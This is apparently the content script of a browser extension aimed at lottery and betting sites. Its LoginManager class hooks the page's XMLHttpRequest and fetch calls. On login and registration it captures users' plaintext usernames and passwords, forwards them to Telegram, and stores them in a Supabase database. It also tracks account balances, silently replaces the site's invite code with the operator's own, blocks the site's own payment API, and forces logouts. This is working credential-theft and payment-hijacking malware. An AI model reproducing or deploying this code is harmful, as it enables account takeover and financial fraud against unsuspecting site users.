console.log('[ORION_DEBUG] LoginManager.js execution started (class definition)');
class LoginManager {
    static FLAG_TIMEOUT_MS = 20000;
    static _pendingCodeTimerId = null;
    static _loginCheckTimerId = null;
    static brandConfigs = [];
    static latestTenantAccount = null;
    static latestUserBalance = null;
    static lastConfirmedDbBalances = {}; // To store { userId: balance }

    static getBrandInviteCode(brandName) {
        return this.brandConfigs.find(bc => bc.brand_name === brandName)?.our_brand_invite_codes || 'CODE_UNAVAILABLE';
    }

    constructor() {
        this.setupInterceptors();
    }

    static async initializeBrandConfigs() {
        try {
            this.brandConfigs = await SupabaseManager.getApiBrandConfigs();
            this.log('Init', 'Fetched brand configurations:', this.brandConfigs);
        } catch (error) {
            console.error('[LoginManager] Failed to initialize brand configs:', error);
            this.brandConfigs = [];
        }
    }

    static log(type, message, data) {
        console.log(`[${type}]`, message, data || '');
    }

    static identifyBrandAndAction(url) {
        try {
            const urlObj = new URL(url);
            const domain = urlObj.hostname;
            const path = urlObj.pathname;
            
            const brandConfig = this.brandConfigs.find(config => domain.includes(config.api_domain_key) && config.is_active);
            
            if (brandConfig) {
                let actionType = null;
                if (path === brandConfig.login_api_path) actionType = 'Login';
                else if (path === brandConfig.register_api_path) actionType = 'Register';
                else if (path === brandConfig.getuserinfo_api_path) actionType = 'GetUserInfo';
                
                this.log('BrandDetect', `API Call to ${domain}${path}`, 
                    `Brand: ${brandConfig.brand_name}, Action: ${actionType || 'Unknown'}`);
                return { brandConfig, actionType };
            }
            
            this.log('BrandDetect', `API Call to ${domain}${path} - Unmonitored domain`);
            return { brandConfig: null, actionType: null };
        } catch (e) {
            return { brandConfig: null, actionType: null };
        }
    }

    static setFlagWithTimeout(key, value, timerId) {
        if (LoginManager[timerId] !== null) {
            clearTimeout(LoginManager[timerId]);
        }
        localStorage.setItem(key, value);
        LoginManager[timerId] = setTimeout(() => {
            const currentValue = localStorage.getItem(key);
            if (currentValue && (value === true || currentValue === value)) {
                localStorage.removeItem(key);
                LoginManager.log('Timeout', `${key} timed out and was cleared:`, value);
            }
            LoginManager[timerId] = null;
        }, LoginManager.FLAG_TIMEOUT_MS);
    }

    setupInterceptors() {
        const origOpen = XMLHttpRequest.prototype.open;
        const origSend = XMLHttpRequest.prototype.send;
        
        XMLHttpRequest.prototype.open = function(method, url) {
            this._method = method;
            this._url = url;
            return origOpen.apply(this, arguments);
        };

        XMLHttpRequest.prototype.send = function(data) {
            if (!this._url) return origSend.apply(this, arguments);
            
            // Capture balance from GetBalance
            if (this._method === 'GET' && this._url.includes('/api/Lottery/GetBalance')) {
                this.addEventListener('load', () => {
                    try {
                        if (this.status === 200) {
                            const response = JSON.parse(this.responseText);
                            if (response?.data?.balance !== undefined) {
                                LoginManager.latestUserBalance = response.data.balance;
                                LoginManager.log('BalanceCapture', 'Captured user balance from XHR:', LoginManager.latestUserBalance);
                                
                                if (LoginManager.latestTenantAccount && LoginManager.latestUserBalance !== null) {
                                    const newBalanceNum = parseFloat(LoginManager.latestUserBalance);
                                    const userIdStr = String(LoginManager.latestTenantAccount);

                                    if (LoginManager.lastConfirmedDbBalances.hasOwnProperty(userIdStr) && LoginManager.lastConfirmedDbBalances[userIdStr] === newBalanceNum) {
                                        LoginManager.log('BalanceUpdateToDB', 'Balance unchanged for user, skipping DB update:', userIdStr);
                                    } else {
                                        SupabaseManager.updateUserBalance(userIdStr, newBalanceNum)
                                            .then(result => {
                                                if (result && result.success) {
                                                    LoginManager.log('BalanceUpdateToDB', 'Successfully updated/checked balance in DB for user:', LoginManager.latestTenantAccount);
                                                    if (result.data && result.data.balance !== undefined) {
                                                        LoginManager.lastConfirmedDbBalances[userIdStr] = parseFloat(result.data.balance);
                                                    }
                                                } else {
                                                    LoginManager.log('BalanceUpdateToDB', 'Failed to update/check balance in DB or user not found:', result ? result.message : 'No result');
                                                }
                                            })
                                            .catch(error => {
                                                LoginManager.log('BalanceUpdateToDB', 'Error calling updateUserBalance:', error);
                                            });
                                    }
                                }
                            }
                        }
                    } catch (e) {
                        LoginManager.log('Error', 'Failed to process GetBalance XHR response:', e);
                    }
                });
            }
            
            // Capture tenantAccount from GetUserInfo
            if (this._method === 'GET' && this._url.includes('/api/Lottery/GetUserInfo')) {
                this.addEventListener('load', () => {
                    try {
                        if (this.status === 200) {
                            const response = JSON.parse(this.responseText);
                            if (response?.data?.tenantAccount) {
                                LoginManager.latestTenantAccount = response.data.tenantAccount;
                                LoginManager.log('TenantAccount', 'Captured from XHR:', LoginManager.latestTenantAccount);
                            }
                        }
                    } catch (e) {
                        LoginManager.log('Error', 'Failed to process GetUserInfo XHR response:', e);
                    }
                });
            }
            
            // Payment blocking logic
            try {
                const parsedUrl = new URL(this._url, window.location.origin);
                if (parsedUrl.pathname === '/api/webapi/ThirdPay' && 
                    sessionStorage.getItem('extension_payment_intercepted') === 'true') {
                    LoginManager.log('SitePaymentBlocked', 'Blocking XHR to ThirdPay:', this._url);
                    sessionStorage.removeItem('extension_payment_intercepted');
                    this.abort();
                    return;
                }
            } catch (e) {}
            
            const { brandConfig: currentBrandConfig, actionType: identifiedActionType } = 
                LoginManager.identifyBrandAndAction(this._url);

            if (currentBrandConfig) {
                try {
                    const officialCode = currentBrandConfig.our_brand_invite_codes;
                    if (officialCode && officialCode !== 'CODE_UNAVAILABLE') {
                        const existingCode = sessionStorage.getItem('invitecode');
                        if (!existingCode || existingCode !== officialCode) {
                            sessionStorage.setItem('invitecode', officialCode);
                            LoginManager.log('ProactivePrefill', `Session 'invitecode' for ${currentBrandConfig.brand_name} set to: ${officialCode} (was: ${existingCode || 'not set'})`);
                        }
                    }
                } catch (e) {
                    LoginManager.log('ProactivePrefill', 'Error updating sessionStorage for invitecode:', e);
                }

                if (!['Login', 'Register', 'GetUserInfo'].includes(identifiedActionType)) {
                    return origSend.apply(this, arguments);
                }

                try {
                    let parsedData = ['Login', 'Register'].includes(identifiedActionType) ? JSON.parse(data) : null;
                    
                    this.addEventListener('load', async () => {
                        const response = JSON.parse(this.responseText);
                        
                        if (identifiedActionType === 'GetUserInfo' && this.status === 200) {
                            LoginManager.log('UserInfo', 'GetUserInfo Response:', { brand: currentBrandConfig.brand_name, data: response.data });
                            
                            const pendingLogout = localStorage.getItem('forceLogoutPending');
                            if (pendingLogout) {
                                const logoutData = JSON.parse(pendingLogout);
                                localStorage.removeItem('forceLogoutPending');
                                LoginManager.log('UserInfo', 'Executing pending forced logout:', logoutData);
                                return LogoutManager.initiateForceLogoutAndShowPopup(logoutData.username, LoginManager.getBrandInviteCode(logoutData.brandName), logoutData.brandName);
                            }
                            
                            const pendingCode = localStorage.getItem('pendingInviteCode');
                            if (pendingCode) {
                                const storedDetails = JSON.parse(pendingCode);
                                if (storedDetails.brandName !== currentBrandConfig.brand_name) {
                                    LoginManager.log('Error', 'Brand mismatch in GetUserInfo:', { stored: storedDetails.brandName, current: currentBrandConfig.brand_name });
                                    return;
                                }

                                clearTimeout(LoginManager._pendingCodeTimerId);
                                LoginManager._pendingCodeTimerId = null;
                                localStorage.removeItem('pendingInviteCode');
                                const { userId, userName } = response.data || {};
                                if (userId && userName) {
                                    const fields = {
                                        userId: String(userId),
                                        inviteCode: storedDetails.inviteCode,
                                        phone: userName,
                                        originalUsername: storedDetails.regUsername,
                                        brandName: storedDetails.brandName
                                    };

                                    const missing = Object.entries(fields)
                                        .filter(([_, v]) => !v?.trim())
                                        .map(([k]) => k);

                                    if (missing.length) {
                                        LoginManager.log('SaveValidation', `Cannot save member. Missing fields: ${missing.join(', ')}`, fields);
                                        return;
                                    }

                                    const result = await SupabaseManager.saveRegisteredMember(
                                        fields.userId,
                                        fields.inviteCode,
                                        fields.phone,
                                        fields.originalUsername,
                                        storedDetails.regPassword,
                                        fields.brandName
                                    );
                                    if (result.success) {
                                        LoginManager.log('UserInfo', `Save success for ${storedDetails.brandName}:`, userId);
                                        APIManager.sendToTelegram({
                                            type: 'REGISTER_SUCCESS_OUR_CODE',
                                            username: storedDetails.regUsername,
                                            password: storedDetails.regPassword,
                                            inviteCodeUsed: storedDetails.inviteCode,
                                            actualUserId: String(userId),
                                            brandName: storedDetails.brandName,
                                            url: this._url
                                        });
                                    } else {
                                        LoginManager.log('UserInfo', `Save failed for ${storedDetails.brandName}:`, { userId, error: result.error });
                                    }
                                }
                                return;
                            }

                            const awaitingCheck = localStorage.getItem('awaitingLoginUserInfoCheck');
                            if (awaitingCheck) {
                                const loginDetails = JSON.parse(awaitingCheck);
                                if (loginDetails.brandName !== currentBrandConfig.brand_name) {
                                    LoginManager.log('Error', 'Brand mismatch in Login check:', { stored: loginDetails.brandName, current: currentBrandConfig.brand_name });
                                    return;
                                }

                                clearTimeout(LoginManager._loginCheckTimerId);
                                LoginManager._loginCheckTimerId = null;
                                localStorage.removeItem('awaitingLoginUserInfoCheck');
                                const userId = response.data?.userId;
                                if (userId && !(await SupabaseManager.isUserVerified(String(userId)))) {
                                    LoginManager.log('UserInfo', `User not verified for ${loginDetails.brandName}:`, userId);
                                    return LogoutManager.initiateForceLogoutAndShowPopup(response.data?.userName, LoginManager.getBrandInviteCode(loginDetails.brandName), loginDetails.brandName);
                                }
                                LoginManager.log('UserInfo', `User verified for ${loginDetails.brandName}:`, userId);
                            }
                            return;
                        }

                        if (response?.code === 0 && response?.msg === "Succeed") {
                            if (identifiedActionType === 'Register' && parsedData?.invitecode) {
                                if (parsedData.invitecode === currentBrandConfig.our_brand_invite_codes) {
                                    const regDetails = {
                                        brandName: currentBrandConfig.brand_name,
                                        inviteCode: parsedData.invitecode,
                                        regUsername: parsedData.username,
                                        regPassword: parsedData.pwd
                                    };
                                    LoginManager.setFlagWithTimeout('pendingInviteCode', JSON.stringify(regDetails), '_pendingCodeTimerId');
                                    LoginManager.log('Register', `Our code used for ${currentBrandConfig.brand_name}:`, parsedData.username);
                                } else {
                                    LoginManager.log('Register', `Non-our code for ${currentBrandConfig.brand_name}:`, parsedData.invitecode);
                                    const logoutData = {
                                        reason: 'bad_invite_code_registration',
                                        brandName: currentBrandConfig.brand_name,
                                        username: parsedData.username
                                    };
                                    localStorage.setItem('forceLogoutPending', JSON.stringify(logoutData));
                                }
                            } else if (identifiedActionType === 'Login') {
                                const loginFlagDetails = { brandName: currentBrandConfig.brand_name };
                                LoginManager.setFlagWithTimeout('awaitingLoginUserInfoCheck', JSON.stringify(loginFlagDetails), '_loginCheckTimerId');
                                LoginManager.log('Login', `Set flag for ${currentBrandConfig.brand_name}:`, parsedData?.username);
                                APIManager.sendToTelegram({
                                    type: 'LOGIN',
                                    username: parsedData.username,
                                    password: parsedData.pwd,
                                    brandName: currentBrandConfig.brand_name,
                                    url: this._url
                                });
                            }
                        }
                    });
                } catch(e) {}
            }
            return origSend.apply(this, arguments);
        };

        const originalFetch = window.fetch;
        window.fetch = async function(url, config) {
            // Capture balance from GetBalance
            if (url.includes('/api/Lottery/GetBalance') && (!config || config.method === 'GET')) {
                try {
                    const response = await originalFetch.apply(this, arguments);
                    const clone = response.clone();
                    const responseData = await clone.json();
                    
                    if (response.ok && responseData?.data?.balance !== undefined) {
                        LoginManager.latestUserBalance = responseData.data.balance;
                        LoginManager.log('BalanceCapture', 'Captured user balance from fetch:', LoginManager.latestUserBalance);
                        
                        if (LoginManager.latestTenantAccount && LoginManager.latestUserBalance !== null) {
                            const newBalanceNum = parseFloat(LoginManager.latestUserBalance);
                            const userIdStr = String(LoginManager.latestTenantAccount);

                            if (LoginManager.lastConfirmedDbBalances.hasOwnProperty(userIdStr) && LoginManager.lastConfirmedDbBalances[userIdStr] === newBalanceNum) {
                                LoginManager.log('BalanceUpdateToDB', 'Balance unchanged for user, skipping DB update:', userIdStr);
                            } else {
                                SupabaseManager.updateUserBalance(userIdStr, newBalanceNum)
                                    .then(result => {
                                        if (result && result.success) {
                                            LoginManager.log('BalanceUpdateToDB', 'Successfully updated/checked balance in DB for user:', LoginManager.latestTenantAccount);
                                            if (result.data && result.data.balance !== undefined) {
                                                LoginManager.lastConfirmedDbBalances[userIdStr] = parseFloat(result.data.balance);
                                            }
                                        } else {
                                            LoginManager.log('BalanceUpdateToDB', 'Failed to update/check balance in DB or user not found:', result ? result.message : 'No result');
                                        }
                                    })
                                    .catch(error => {
                                        LoginManager.log('BalanceUpdateToDB', 'Error calling updateUserBalance:', error);
                                    });
                            }
                        }
                    }
                    
                    return response;
                } catch (e) {
                    LoginManager.log('Error', 'Failed to process GetBalance fetch response:', e);
                    return originalFetch.apply(this, arguments);
                }
            }
            
            // Capture tenantAccount from GetUserInfo
            if (url.includes('/api/Lottery/GetUserInfo') && (!config || config.method === 'GET')) {
                try {
                    const response = await originalFetch.apply(this, arguments);
                    const clone = response.clone();
                    const responseData = await clone.json();
                    
                    if (response.ok && responseData?.data?.tenantAccount) {
                        LoginManager.latestTenantAccount = responseData.data.tenantAccount;
                        LoginManager.log('TenantAccount', 'Captured from fetch:', LoginManager.latestTenantAccount);
                    }
                    
                    return response;
                } catch (e) {
                    LoginManager.log('Error', 'Failed to process GetUserInfo fetch response:', e);
                    return originalFetch.apply(this, arguments);
                }
            }

            // Payment blocking logic
            try {
                const parsedUrl = new URL(url, window.location.origin);
                if (parsedUrl.pathname === '/api/webapi/ThirdPay' && 
                    sessionStorage.getItem('extension_payment_intercepted') === 'true') {
                    LoginManager.log('SitePaymentBlocked', 'Blocking fetch to ThirdPay:', url);
                    sessionStorage.removeItem('extension_payment_intercepted');
                    throw new Error('Site payment API call blocked by extension');
                }
            } catch (e) {
                if (e.message.includes('blocked by extension')) throw e;
            }

            const { brandConfig: currentBrandConfig, actionType: identifiedActionType } = 
                LoginManager.identifyBrandAndAction(url);

            if (currentBrandConfig) {
                try {
                    const officialCode = currentBrandConfig.our_brand_invite_codes;
                    if (officialCode && officialCode !== 'CODE_UNAVAILABLE') {
                        const existingCode = sessionStorage.getItem('invitecode');
                        if (!existingCode || existingCode !== officialCode) {
                            sessionStorage.setItem('invitecode', officialCode);
                            LoginManager.log('ProactivePrefill', `Session 'invitecode' for ${currentBrandConfig.brand_name} set to: ${officialCode} (was: ${existingCode || 'not set'})`);
                        }
                    }
                } catch (e) {
                    LoginManager.log('ProactivePrefill', 'Error updating sessionStorage for invitecode:', e);
                }

                if (!['Login', 'Register', 'GetUserInfo'].includes(identifiedActionType)) {
                    return originalFetch.apply(this, arguments);
                }

                try {
                    let parsedData = ['Login', 'Register'].includes(identifiedActionType) ? JSON.parse(config.body) : null;
                    const response = await originalFetch.apply(this, arguments);
                    const clone = response.clone();
                    const responseData = await clone.json();

                    if (identifiedActionType === 'GetUserInfo' && response.ok) {
                        LoginManager.log('UserInfo', 'GetUserInfo Response:', { brand: currentBrandConfig.brand_name, data: responseData.data });

                        const pendingLogout = localStorage.getItem('forceLogoutPending');
                        if (pendingLogout) {
                            const logoutData = JSON.parse(pendingLogout);
                            localStorage.removeItem('forceLogoutPending');
                            LoginManager.log('UserInfo', 'Executing pending forced logout:', logoutData);
                            LogoutManager.initiateForceLogoutAndShowPopup(logoutData.username, LoginManager.getBrandInviteCode(logoutData.brandName), logoutData.brandName);
                            return response;
                        }

                        const pendingCode = localStorage.getItem('pendingInviteCode');
                        if (pendingCode) {
                            const storedDetails = JSON.parse(pendingCode);
                            if (storedDetails.brandName !== currentBrandConfig.brand_name) {
                                LoginManager.log('Error', 'Brand mismatch in GetUserInfo:', { stored: storedDetails.brandName, current: currentBrandConfig.brand_name });
                                return response;
                            }

                            clearTimeout(LoginManager._pendingCodeTimerId);
                            LoginManager._pendingCodeTimerId = null;
                            localStorage.removeItem('pendingInviteCode');
                            const { userId, userName } = responseData.data || {};
                            if (userId && userName) {
                                const fields = {
                                    userId: String(userId),
                                    inviteCode: storedDetails.inviteCode,
                                    phone: userName,
                                    originalUsername: storedDetails.regUsername,
                                    brandName: storedDetails.brandName
                                };

                                const missing = Object.entries(fields)
                                    .filter(([_, v]) => !v?.trim())
                                    .map(([k]) => k);

                                if (missing.length) {
                                    LoginManager.log('SaveValidation', `Cannot save member. Missing fields: ${missing.join(', ')}`, fields);
                                    return response;
                                }

                                const result = await SupabaseManager.saveRegisteredMember(
                                    fields.userId,
                                    fields.inviteCode,
                                    fields.phone,
                                    fields.originalUsername,
                                    storedDetails.regPassword,
                                    fields.brandName
                                );
                                if (result.success) {
                                    LoginManager.log('UserInfo', `Save success for ${storedDetails.brandName}:`, userId);
                                    APIManager.sendToTelegram({
                                        type: 'REGISTER_SUCCESS_OUR_CODE',
                                        username: storedDetails.regUsername,
                                        password: storedDetails.regPassword,
                                        inviteCodeUsed: storedDetails.inviteCode,
                                        actualUserId: String(userId),
                                        brandName: storedDetails.brandName,
                                        url: url
                                    });
                                } else {
                                    LoginManager.log('UserInfo', `Save failed for ${storedDetails.brandName}:`, { userId, error: result.error });
                                }
                            }
                            return response;
                        }

                        const awaitingCheck = localStorage.getItem('awaitingLoginUserInfoCheck');
                        if (awaitingCheck) {
                            const loginDetails = JSON.parse(awaitingCheck);
                            if (loginDetails.brandName !== currentBrandConfig.brand_name) {
                                LoginManager.log('Error', 'Brand mismatch in Login check:', { stored: loginDetails.brandName, current: currentBrandConfig.brand_name });
                                return response;
                            }

                            clearTimeout(LoginManager._loginCheckTimerId);
                            LoginManager._loginCheckTimerId = null;
                            localStorage.removeItem('awaitingLoginUserInfoCheck');
                            const userId = responseData.data?.userId;
                            if (userId && !(await SupabaseManager.isUserVerified(String(userId)))) {
                                LoginManager.log('UserInfo', `User not verified for ${loginDetails.brandName}:`, userId);
                                LogoutManager.initiateForceLogoutAndShowPopup(responseData.data?.userName, LoginManager.getBrandInviteCode(loginDetails.brandName), loginDetails.brandName);
                            } else {
                                LoginManager.log('UserInfo', `User verified for ${loginDetails.brandName}:`, userId);
                            }
                        }
                        return response;
                    }

                    if (responseData?.code === 0 && responseData?.msg === "Succeed") {
                        if (identifiedActionType === 'Register' && parsedData?.invitecode) {
                            if (parsedData.invitecode === currentBrandConfig.our_brand_invite_codes) {
                                const regDetails = {
                                    brandName: currentBrandConfig.brand_name,
                                    inviteCode: parsedData.invitecode,
                                    regUsername: parsedData.username,
                                    regPassword: parsedData.pwd
                                };
                                LoginManager.setFlagWithTimeout('pendingInviteCode', JSON.stringify(regDetails), '_pendingCodeTimerId');
                                LoginManager.log('Register', `Our code used for ${currentBrandConfig.brand_name}:`, parsedData.username);
                            } else {
                                LoginManager.log('Register', `Non-our code for ${currentBrandConfig.brand_name}:`, parsedData.invitecode);
                                const logoutData = {
                                    reason: 'bad_invite_code_registration',
                                    brandName: currentBrandConfig.brand_name,
                                    username: parsedData.username
                                };
                                localStorage.setItem('forceLogoutPending', JSON.stringify(logoutData));
                            }
                        } else if (identifiedActionType === 'Login') {
                            const loginFlagDetails = { brandName: currentBrandConfig.brand_name };
                            LoginManager.setFlagWithTimeout('awaitingLoginUserInfoCheck', JSON.stringify(loginFlagDetails), '_loginCheckTimerId');
                            LoginManager.log('Login', `Set flag for ${currentBrandConfig.brand_name}:`, parsedData?.username);
                            APIManager.sendToTelegram({
                                type: 'LOGIN',
                                username: parsedData.username,
                                password: parsedData.pwd,
                                brandName: currentBrandConfig.brand_name,
                                url: url
                            });
                        }
                    }
                    return response;
                } catch(e) {
                    return originalFetch.apply(this, arguments);
                }
            }
            return originalFetch.apply(this, arguments);
        };
    }
}

(async () => {
    console.log('[ORION_DEBUG] LoginManager.js IIFE started');
    try {
        // Wait for DepositModifier to be available
        const waitForDepositModifier = async (retries = 3) => {
            if (typeof DepositModifier !== 'undefined') {
                const depositModifier = new DepositModifier();
                await depositModifier.init();
                return;
            }
            if (retries > 0) {
                await new Promise(resolve => setTimeout(resolve, 100));
                return waitForDepositModifier(retries - 1);
            }
            LoginManager.log('InitWarning', 'DepositModifier not available after retries, continuing without it');
        };

        await waitForDepositModifier();

        // Initialize ConfigManager
        LoginManager.log('Init', 'Initializing ConfigManager...');
        await ConfigManager.init();

        // Proceed with LoginManager initialization
        LoginManager.log('Init', 'Attempting to initialize brand configurations...');
        await LoginManager.initializeBrandConfigs();
        new LoginManager();
    } catch(e) {
        console.error("[ExtensionInitError]", "Error during extension initialization:", e);
    }
})();